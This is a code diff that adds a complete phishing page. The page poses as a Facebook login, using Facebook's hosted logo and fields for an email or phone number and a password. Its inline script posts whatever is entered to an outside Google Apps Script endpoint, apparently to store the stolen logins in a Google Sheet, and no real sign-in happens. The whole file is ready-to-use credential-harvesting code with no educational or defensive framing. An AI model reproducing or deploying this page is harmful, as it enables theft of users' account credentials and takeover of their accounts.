@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Data Send Google sheet</title>
+  </head>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0%;
+    }
+    body {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      /* background-color: rgb(184, 203, 37); */
+    }
+    section {
+      width: 350px;
+      background-color: rgb(226, 241, 254);
+      padding: 6px 2px;
+    }
+    form {
+      width: 80%;
+      margin: auto;
+    }
+    .input_item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 4px;
+    }
+    .input_item > label {
+      display: none;
+    }
+    .input_item > input {
+      padding: 6px 12px;
+      width: 100%;
+      border: solid gray 2px;
+      border-radius: 2px;
+      font-size: 14px;
+    }
+    .fb_logo {
+      width: 150px;
+    }
+    #submit {
+      padding: 6px 12px;
+      width: 100%;
+      background-color: #78a2fd;
+      border: none;
+      color: white;
+    }
+  </style>
+  <body>
+    <section>
+      <div>
+        <div>
+          <img
+            class="fb_logo"
+            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
+            alt=""
+            srcset=""
+          />
+        </div>
+        <form id="form">
+          <div class="input_item">
+            <label>Name:</label>
+            <input
+              type="text"
+              name="id"
+              placeholder="Mobile number or email address"
+            />
+          </div>
+          <div class="input_item">
+            <label>Mobile:</label>
+            <input type="text" name="password" placeholder="Password" />
+          </div>
+          <!-- <div class="input_item">
+            <label>Password:</label>
+            <input type="text" placeholder="Name" />
+          </div> -->
+          <div class="input_item">
+            <button id="submit">submit</button>
+          </div>
+        </form>
+      </div>
+    </section>
+  </body>
+  <script>
+    let url =
+      "https://script.google.com/macros/s/AKfycbwNASl9ybO5Y-XAyhQ_5aw-RLqd0bzj9O1jv-aDrYnCzxP2h3bImob1GnUtFKSIv4J0/exec";
+    let form = document.querySelector("#form");
+    form.addEventListener("submit", (e) => {
+      let _d = new FormData(form);
+      fetch(url, {
+        method: "POST",
+        body: _d,
+      })
+        .then((res) => res.text())
+        .then((fres) => console.log(fres));
+      e.preventDefault();
+    });
+  </script>
+</html>
